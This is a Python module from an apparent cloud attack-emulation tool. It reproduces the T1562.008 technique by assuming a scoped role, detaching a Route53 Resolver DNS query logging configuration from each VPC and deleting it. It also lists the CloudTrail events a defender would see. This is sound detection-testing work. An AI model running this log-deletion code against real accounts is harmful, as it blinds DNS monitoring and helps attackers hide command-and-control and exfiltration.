"""
Technique : aws.defense-evasion.dns-delete-logs
Tactic    : Defense Evasion (T1562.008 - Impair Defenses: Disable or Modify Cloud Logs)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/

How the attack works:
  An attacker with route53resolver:DeleteResolverQueryLogConfig deletes a
  Route53 Resolver query logging configuration, eliminating DNS query visibility
  used to detect C2 and data exfiltration over DNS.

Detection signal:
  - route53resolver:DeleteResolverQueryLogConfig in CloudTrail. Eliminating DNS
    visibility is a high-confidence defense evasion indicator.

Revert:
  - Not reversible from the attack. `pulumi up` recreates the config.

Credential model:
  Option B. The technique is destructive, so the attack assumes the scoped
  attacker role created by infra/ (the resolver query-log actions only) instead
  of acting as the tenant's cross-account role.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
  Reads `resolver_query_log_config_id` and `attacker_role_arn` from the outputs.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The destructive call is
    then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    config_id = (outputs or {}).get("resolver_query_log_config_id", "")
    if not config_id:
        raise RuntimeError("Missing required Pulumi output: resolver_query_log_config_id")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1562008-dnslogs")
    r53_client = session.client("route53resolver", region_name=region)

    # ── Step 1: Disassociate the config from every VPC ──────────────────────
    # DeleteResolverQueryLogConfig is rejected while any VPC is still associated
    # (RSLVR-01201). Detaching the config from the VPC produces the same DNS
    # blind spot and is itself a defense-evasion signal.
    banner("Step 1 - Disassociate query log config from VPCs (DisassociateResolverQueryLogConfig)")
    assoc_ids = []
    try:
        paginator = r53_client.get_paginator("list_resolver_query_log_config_associations")
        for page in paginator.paginate(
            Filters=[{"Name": "ResolverQueryLogConfigId", "Values": [config_id]}]
        ):
            for a in page.get("ResolverQueryLogConfigAssociations", []):
                if a.get("Status") in ("DELETED", "FAILED"):
                    continue
                r53_client.disassociate_resolver_query_log_config(
                    ResolverQueryLogConfigId=config_id, ResourceId=a["ResourceId"],
                )
                assoc_ids.append(a["Id"])
                print(f"  [+] Disassociated from VPC {a['ResourceId']} (assoc {a['Id']})")
                print("  [!] CloudTrail event: route53resolver:DisassociateResolverQueryLogConfig")
    except ClientError as exc:
        print(f"  [!] Disassociate failed: {exc}")
        raise

    # Wait for disassociations to finish (usually seconds).
    for _ in range(30):
        remaining = [
            a for a in r53_client.list_resolver_query_log_config_associations(
                Filters=[{"Name": "ResolverQueryLogConfigId", "Values": [config_id]}]
            ).get("ResolverQueryLogConfigAssociations", [])
            if a.get("Status") not in ("DELETED", "FAILED")
        ]
        if not remaining:
            break
        time.sleep(4)

    # ── Step 2: Delete the resolver query log config ────────────────────────
    banner("Step 2 - Delete Route53 Resolver query log config (DeleteResolverQueryLogConfig)")
    try:
        r53_client.delete_resolver_query_log_config(ResolverQueryLogConfigId=config_id)
        print(f"  [+] Resolver query log config deleted: {config_id}")
        print("  [!] CloudTrail event: route53resolver:DeleteResolverQueryLogConfig")
        print("  [!] DNS query logging is now DISABLED for the affected VPCs.")
    except ClientError as exc:
        print(f"  [!] DeleteResolverQueryLogConfig failed: {exc}")
        raise

    banner("Complete")
    print("CloudTrail events generated: sts:AssumeRole, "
          "route53resolver:DisassociateResolverQueryLogConfig, "
          "route53resolver:DeleteResolverQueryLogConfig")
